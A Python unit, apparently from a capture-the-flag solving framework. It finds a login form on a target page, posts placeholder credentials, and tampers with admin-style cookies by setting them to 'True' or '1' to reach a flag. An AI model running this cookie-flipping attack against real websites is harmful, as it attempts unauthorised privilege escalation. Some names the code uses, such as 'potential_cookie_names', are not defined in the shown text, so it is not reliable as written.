from unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
import units.raw
import re
import units.web as web
import requests
import magic
import units


class Unit(web.WebUnit):

	def __init__(self, katana, parent, target):

		# Run the parent constructor, to ensure this is a valid URL
		super(Unit, self).__init__(katana, parent, target)
		if not katana.config['flag_format']:
			raise units.NotApplicable('no flag format supplied')

		raw_content = self.target.content.decode('utf-8')

		self.action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", raw_content, flags=re.IGNORECASE)
		self.method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", raw_content, flags=re.IGNORECASE)

		self.username = re.findall(web.user_regex, raw_content, flags=re.IGNORECASE)
		self.password = re.findall(web.pass_regex, raw_content, flags=re.IGNORECASE)
	
			# Only run this if we have potential information...
		if not (self.action and self.method and self.username and self.password):
			raise units.NotApplicable('no form found')

	def evaluate(self, katana, case):
		
		if self.action and self.method and self.username and self.password:
			if self.action: action = self.action[0]
			if self.method: method = self.method[0]
			if self.username: username = self.username[0]
			if self.password: password = self.password[0]

			s = requests.Session()
			try:
				r = s.request(method.lower(), self.target.url_root.rstrip('/') + '/' + action, data = { username: "anything", password : "anything"})
			except:
				# JOHN: Theoretically, if we find a valid method, this should not error...
				#       But if it does, we should see it.
				traceback.print_exc()
			
			# Check out the cookies. Flip them if they are boolean, look for flags.
			if s.cookies:
				for admin_cookie in potential_cookie_names:
					if admin_cookie in s.cookies.keys():
						if s.cookies[admin_cookie] == 'False':
							new = requests.get(r.url, cookies = { admin_cookie : 'True' })
							if katana.locate_flags(self, new.text): break
						else:
							new = requests.get(r.url, cookies = { admin_cookie : '1' })
							if katana.locate_flags(self, new.text): break
